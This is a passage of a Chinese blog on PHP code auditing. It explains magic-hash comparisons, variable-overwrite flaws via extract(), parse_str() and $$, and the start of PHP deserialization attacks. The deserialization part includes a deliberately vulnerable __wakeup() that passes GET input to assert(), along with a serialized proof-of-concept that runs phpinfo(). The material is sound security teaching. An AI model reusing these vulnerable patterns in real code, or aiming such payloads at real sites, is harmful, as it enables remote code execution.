<h3 id="7-Magic-Hashes"><a href="#7-Magic-Hashes" class="headerlink" title="7)    Magic Hashes"></a>7)    Magic Hashes</h3><p><a href="https://www.whitehatsec.com/blog/magic-hashes/" target="_blank" rel="noopener">https://www.whitehatsec.com/blog/magic-hashes/</a><br>PHP中当利用!=或==进行比较时，会把以0e开头的值视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0<br>所以当两个不同的密码经过哈希以后，如果其哈希值恰好都是以0e开头的，那么PHP会认为他们相同，都是0<br>MD5或者其他哈希算法值是以0e开头的 其实不多</p>
<h4 id="示例1-6"><a href="#示例1-6" class="headerlink" title="示例1"></a>示例1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0e1234567890&quot;==&quot;0&quot;);   //true</span><br><span class="line">var_dump(&quot;0e1234567890&quot;===&quot;0&quot;);  //false</span><br><span class="line">var_dump(&quot;10&quot; == &quot;1e1&quot;); // 10 == 10 -&gt; true   php以科学计数形式将字符串转换为对应数字(1e1 = 1*10^1 = 1)</span><br><span class="line">var_dump(100 == &quot;1e2&quot;); //true</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">echo md5(&apos;240610708&apos;);  //0e462097431906509019562988736854</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo md5(&apos;QNKCDZO&apos;);  //0e830400451993494058024219903391</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if ( md5(&apos;240610708&apos;) == md5(&apos;QNKCDZO&apos;)) &#123;</span><br><span class="line">echo &quot;ok&quot;;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="实例-wordpress-cookie伪造漏洞（CVE-2014-0166）"><a href="#实例-wordpress-cookie伪造漏洞（CVE-2014-0166）" class="headerlink" title="实例-wordpress- cookie伪造漏洞（CVE -2014- 0166）"></a>实例-wordpress- cookie伪造漏洞（CVE -2014- 0166）</h4><p><a href="https://www.freebuf.com/news/67007.html" target="_blank" rel="noopener">https://www.freebuf.com/news/67007.html</a> </p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h4><p><a href="https://www.freebuf.com/articles/web/166543.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/166543.html</a>  PHP弱类型引发的漏洞实例<br><a href="http://vinc.top/2017/04/04/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">http://vinc.top/2017/04/04/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</a>  PHP弱类型安全问题汇总<br><a href="http://blog.topsec.com.cn/?p=2137" target="_blank" rel="noopener">http://blog.topsec.com.cn/?p=2137</a>  php代码审计之弱类型引发的灾难</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/31/PHP变量覆盖/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/31/PHP变量覆盖/" itemprop="url">PHP变量覆盖</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-31T16:07:11+08:00">
                2019-01-31
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>变量覆盖是指利用自定义的参数值替换掉原有的变量值。变量覆盖漏洞通常需要结合代码中的其他功能来实现完整的攻击。<br>常见可导致变量覆盖漏洞的函数或方法有PHP超全局变量、register_globals、$$、parse_str()函数使用不当、extract()、import_request_variables()等。</p>
<h3 id="1-PHP超全局变量"><a href="#1-PHP超全局变量" class="headerlink" title="1)    PHP超全局变量"></a>1)    PHP超全局变量</h3><p><a href="http://php.net/manual/zh/language.variables.superglobals.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.variables.superglobals.php</a></p>
<p>PHP 中的许多预定义变量都是“超全局的”，在一个脚本的全部作用域中都可用。在函数或方法中无需执行 global $variable; 就可以访问它们。<br>2019年1月11日ThinkPHP 5.0.x~5.2x爆出的远程代码执行漏洞就与$_POST变量覆盖相关。<br>这些超全局变量是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS  包含了全部变量的全局组合数组。</span><br><span class="line">$_SERVER  包含服务器和执行环境等信息的数组。</span><br><span class="line">$_GET  通过 URL 参数传递给当前脚本的变量的数组</span><br><span class="line">$_POST  当 HTTP POST 请求的 Content-Type 是 application/x-www-form-urlencoded 或 multipart/form-data 时，会将变量以关联数组形式传入当前脚本。</span><br><span class="line">$_FILES  HTTP 文件上传变量。通过 HTTP POST 方式上传到当前脚本的项目的数组。</span><br><span class="line">$_COOKIE  通过 HTTP Cookies 方式传递给当前脚本的变量的数组</span><br><span class="line">$_SESSION  当前脚本可用 SESSION 变量的数组</span><br><span class="line">$_REQUEST  默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组</span><br><span class="line">$_ENV  通过环境方式传递给当前脚本的变量的数组</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name = &quot;Tom&quot;;</span><br><span class="line">echo $name.&quot;&lt;br&gt;&quot;;  //输出Tom</span><br><span class="line"></span><br><span class="line">$name = $_POST[&apos;www&apos;];</span><br><span class="line">echo $name.&quot;&lt;br&gt;&quot;;  //POST:www=ppl  输出ppl</span><br><span class="line">print_r($_POST);   //输出 Array ( [www] =&gt; ppl ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>　</p>
<h3 id="2-register-globals"><a href="#2-register-globals" class="headerlink" title="2)    register_globals"></a>2)    register_globals</h3><p><a href="http://php.net/manual/zh/security.globals.php" target="_blank" rel="noopener">http://php.net/manual/zh/security.globals.php</a><br>当php.ini 中register_globals= On时 设置注册全局变量，将传递过来的值直接注册为全局变量并可直接使用。（必须是之前没有声明的变量，如果之前变量已经存在就无法覆盖）。<br>该特性从PHP 4.2.0开始将register_globals默认值设置为off，自 PHP 5.3.0 起废弃，自 PHP 5.4.0 起移除。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//测试 PHP Version 5.2.17</span><br><span class="line">//请求: xxx.php?www=1</span><br><span class="line">echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;;  </span><br><span class="line">echo &apos;$www :&apos;.$www;        </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">请求: xxx.php?www=1</span><br><span class="line">当php.ini 中设置 register_globals = On时，输出:</span><br><span class="line">Register_globals: 1</span><br><span class="line">$www :1 </span><br><span class="line">注册了个全局变量$www,并可直接使用  </span><br><span class="line"></span><br><span class="line">当php.ini 中设置 register_globals = Off时，输出：</span><br><span class="line">Register_globals: 0</span><br><span class="line">$www :</span><br></pre></td></tr></table></figure>
<h3 id="3"><a href="#3" class="headerlink" title="3)    $$"></a>3)    $$</h3><p>$$ 导致的变量覆盖常在foreach中出现，使用foreach来遍历数组中的值，然后将获取到的数组键名作为变量名，数组中的键值作为变量的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = 0;</span><br><span class="line">foreach (array(&apos;_COOKIE&apos;,&apos;_POST&apos;,&apos;_GET&apos;) as $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    foreach ($$_request as $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        //echo $_key.&quot;&lt;/br&gt;&quot;;</span><br><span class="line">        $$_key=  addslashes($_value);   //GET: ?id=1   覆盖掉之前$id得值  现在id值为1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $id;  //GET: xxx.php?id=1  输出1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="4-parse-str"><a href="#4-parse-str" class="headerlink" title="4)    parse_str()"></a>4)    parse_str()</h3><p>parse_str ( string $encoded_string [, array &amp;$result ] )<br>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域<br>当没有result 参数时，可造成变量覆盖，在 PHP 7.2 中废弃不设置参数的行为。<br>推荐的安全写法：设置第二个变量 result， 变量将会以数组元素的形式存入到这个数组。</p>
<h4 id="不安全写法："><a href="#不安全写法：" class="headerlink" title="不安全写法："></a>不安全写法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name = &quot;Tom&quot;;</span><br><span class="line">$age = 18;</span><br><span class="line">parse_str(&quot;name=ppl&amp;age=20&quot;);  //覆盖掉原来变量name和age的值</span><br><span class="line">echo $name.&quot;&lt;br&gt;&quot;;  //输出ppl</span><br><span class="line">echo $age.&quot;&lt;br&gt;&quot;; //输出20</span><br></pre></td></tr></table></figure>
<h4 id="推荐的安全写法："><a href="#推荐的安全写法：" class="headerlink" title="推荐的安全写法："></a>推荐的安全写法：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//推荐用法:</span><br><span class="line">$name = &quot;Tom&quot;;</span><br><span class="line">$age = &quot;18&quot;;</span><br><span class="line">parse_str(&quot;name=ppl&amp;age=20&quot;,$output);  //不会覆盖原变量</span><br><span class="line">echo $name.&quot;&lt;br&gt;&quot;; //还是原来的值Tom</span><br><span class="line">echo $age.&quot;&lt;br&gt;&quot;;  //还是原来的值18</span><br><span class="line">echo $output[&apos;name&apos;].&quot;&lt;br&gt;&quot;;  //输出ppl</span><br><span class="line">echo $output[&apos;age&apos;].&quot;&lt;br&gt;&quot;;   //输出20</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="5-extract"><a href="#5-extract" class="headerlink" title="5)    extract()"></a>5)    extract()</h3><p>extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )<br>将变量从数组中导入到当前的符号表中<br>参数 array一个关联数组。此函数会将键名当作变量名，值作为变量的值。 对每个键／值对都会在当前的符号表中建立变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//case1:</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array); //变量a值被覆盖为Cat</span><br><span class="line">echo &quot;a: $a; b: $b; c: $c&quot;.&quot;&lt;br&gt;&quot;;  //输出a: Cat; b: Dog; c: Horse</span><br><span class="line"></span><br><span class="line">//case2:</span><br><span class="line">$www = &apos;0&apos;;    //请求 GET: xxx.php?www=1</span><br><span class="line">//var_dump($_GET);</span><br><span class="line">extract($_GET);   //变量www值被覆盖为1</span><br><span class="line">echo &quot;www: $www&quot;.&quot;&lt;br&gt;&quot;; //输出www: 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="6-import-request-variables"><a href="#6-import-request-variables" class="headerlink" title="6)    import_request_variables()"></a>6)    import_request_variables()</h3><p>import_request_variables ( string $types [, string $prefix ] )<br>(PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0)<br>将 GET／POST／Cookie 变量导入到全局作用域中。<br>可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。不区分大小写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">//测试 PHP Version 5.2.17</span><br><span class="line">$a = &apos;0&apos;;  </span><br><span class="line">import_request_variables(&apos;GPC&apos;);    </span><br><span class="line">echo &quot;a: $a&quot;.&quot;&lt;br&gt;&quot;; //请求xxx.php?a=1  输出a: 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h4><p><a href="https://p0sec.net/index.php/archives/35/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/35/</a>   PHP变量覆盖漏洞总结<br><a href="https://paper.tuisec.win/detail/85acab5a4db60f4" target="_blank" rel="noopener">https://paper.tuisec.win/detail/85acab5a4db60f4</a>  由MetInfo 深入理解PHP变量覆盖漏洞</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/26/PHP反序列化/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="pplsec">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/ppl.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="pplsec">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/26/PHP反序列化/" itemprop="url">PHP反序列化</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-26T19:12:21+08:00">
                2019-01-26
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文主要介绍1）序列化与反序列化基础 2）反序列化漏洞与魔法函数  3）CVE-2016-7124  4）Session反序列化漏洞  5）phar伪协议触发php反序列化  6）补充:phar伪协议绕过WAF</p>
<h3 id="一-序列化与反序列化基础"><a href="#一-序列化与反序列化基础" class="headerlink" title="(一)    序列化与反序列化基础"></a>(一)    序列化与反序列化基础</h3><p>serialize()将一个对象转换成一个字符串<br>unserialize()将字符串还原为一个对象</p>
<h4 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h4><p>在php中创建了一个对象后，可通过serialize()把这个对象转变成一个字符串，这有利于存储或传递PHP的值，同时不丢失其类型和结构。</p>
<h5 id="序列化示例代码"><a href="#序列化示例代码" class="headerlink" title="序列化示例代码"></a>序列化示例代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">	var $test = &apos;hello123&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = new lltest;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line">//var_dump($class1_ser);</span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h5 id="序列化数据格式说明"><a href="#序列化数据格式说明" class="headerlink" title="序列化数据格式说明"></a>序列化数据格式说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;</span><br><span class="line">表示一个lltest对象，属性test（字符串）值为20</span><br><span class="line">O表示存储的是class对象（object）,如果serialize()传入的是一个数组，就会为字母a。</span><br><span class="line">6表示对象的名称有6个字符。&quot;lltest&quot;为对象的名称。</span><br><span class="line">1表示有一个值。</span><br><span class="line">&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称</span><br><span class="line"></span><br><span class="line">O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;</span><br><span class="line">表示一个User对象，有两个属性，属性age值为20，属性name值为john</span><br></pre></td></tr></table></figure>
<h4 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h4><p>unserialize()可以从序列化后的字符串中恢复为原来的对象（object）</p>
<h5 id="反序列化示例代码"><a href="#反序列化示例代码" class="headerlink" title="反序列化示例代码"></a>反序列化示例代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class lltest&#123;</span><br><span class="line">	var $test = &apos;hello123&apos;;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $class2_ser = &apos;O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;&apos;;</span><br><span class="line"> $class2_unser = unserialize($class2_ser);</span><br><span class="line"> print_r($class2_unser);</span><br><span class="line"> //var_dump($class2_unser);</span><br><span class="line"> //输出：lltest Object ( [test] =&gt; hello123 ) </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="二-反序列化漏洞与魔法函数"><a href="#二-反序列化漏洞与魔法函数" class="headerlink" title="(二)    反序列化漏洞与魔法函数"></a>(二)    反序列化漏洞与魔法函数</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>PHP调用unserialize()后会自动调用魔术方法__wakeup()和__destruct()。理想的情况就是当魔术方法__wakeup()或__destruct()中存在漏洞代码或者变量可控等，就可能导致远程命令执行（RCE）等漏洞。也可以间接调用或者利用普通成员方法-相同函数名称触发漏洞。</p>
<h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。<br><a href="http://php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.oop5.magic.php</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__wakeup():当调用unserialize()函数时，unserialize() 会检查是否存在一个\__wakeup() 方法。如果存在，则会先调用\__wakeup 方法，预先准备对象需要的资源。</span><br><span class="line">__destruct()：析构函数,当对象被销毁时会自动调用。</span><br><span class="line">__construct()：构造函数,当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">__sleep():serialize() 函数会检查类中是否存在 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。</span><br><span class="line">__invoke():当把一个类当作函数使用时自动调用</span><br><span class="line">__tostring():当把一个类当作字符串使用时自动调用</span><br><span class="line">__call():当要调用的方法不存在或权限不足时自动调用</span><br></pre></td></tr></table></figure>
<h4 id="反序列化时魔术方法调用示例"><a href="#反序列化时魔术方法调用示例" class="headerlink" title="反序列化时魔术方法调用示例"></a>反序列化时魔术方法调用示例</h4><p>PHP调用unserialize()后会自动调用魔术方法__wakeup() 和__destruct()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class lltest&#123;</span><br><span class="line">	var $test = &apos;hello123&apos;;</span><br><span class="line">	</span><br><span class="line">	function __wakeup()&#123;  //unserialize()时会自动调用</span><br><span class="line">		echo &quot;__wakeup&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __construct()&#123;  //当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</span><br><span class="line">		echo &quot;__construct&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __destruct()&#123;  //当对象被销毁时会自动调用</span><br><span class="line">		echo &quot;__destruct&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> $class2_ser = &apos;O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;test&quot;;s:8:&quot;hello123&quot;;&#125;&apos;;</span><br><span class="line"> $class2_unser = unserialize($class2_ser);</span><br><span class="line"> print_r($class2_unser);</span><br><span class="line"> echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">//输出：</span><br><span class="line"> //__wakeup</span><br><span class="line"> //lltest Object ( [test] =&gt; hello123 )</span><br><span class="line"> //__destruct</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行代码会输出如下，说明调用unserialize()后会自动调用魔术方法__wakeup() 和__destruct()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__wakeup</span><br><span class="line">lltest Object ( [test] =&gt; hello123 )</span><br><span class="line">__destruct</span><br></pre></td></tr></table></figure></p>
<h4 id="wakeup-或-destruct"><a href="#wakeup-或-destruct" class="headerlink" title="__wakeup() 或__destruct()"></a>__wakeup() 或__destruct()</h4><p>PHP调用unserialize()后会自动调用魔术方法__wakeup()和__destruct()</p>
<h5 id="wakeup-漏洞代码示例"><a href="#wakeup-漏洞代码示例" class="headerlink" title="__wakeup()漏洞代码示例"></a>__wakeup()漏洞代码示例</h5><p>PHP调用unserialize()后会自动调用魔术方法__wakeup()，执行__wakeup()中的assert，相当于执行assert(“phpinfo();”);</p>
<h6 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $code;</span><br><span class="line">    function __wakeup()//function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">       assert($this-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = $_GET[&apos;www&apos;];</span><br><span class="line">unserialize($poc);</span><br><span class="line">//xxx.php?www=O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">//相当于执行assert(&quot;phpinfo();&quot;);</span><br></pre></td></tr></table></figure>
<h6 id="生成POC"><a href="#生成POC" class="headerlink" title="生成POC"></a>生成POC</h6><p>生成序列化POC，要求对象名/变量名(lltest/code) 与要触发代码的一样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class lltest&#123;</span><br><span class="line">    var $code=&quot;phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$myclass = new lltest;</span><br><span class="line">$myclass_ser_poc = serialize($myclass);</span><br><span class="line">echo $myclass_ser_poc;</span><br><span class="line">//输出 O:6:&quot;lltest&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br><span class="line">//生成序列化POC</span><br><span class="line">// 生成POC 要求对象名/变量名(lltest/code) 与要触发代码的一样</span><br></pre></td></tr></table></figure>
<h4 id="间接调用"><a href="#间接调用" class="headerlink" title="间接调用"></a>间接调用</h4><p>如果unserialize()中并不会自动调用的魔术函数，如__construct()，是不是就没有利用价值呢？不是。有时反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可能层层间接调用触发漏洞。<br>比如__construct()方法中存在漏洞代码，正好在__wakeup()中new创建对象，所以unserialize()时 间接触发漏洞代码    </p>
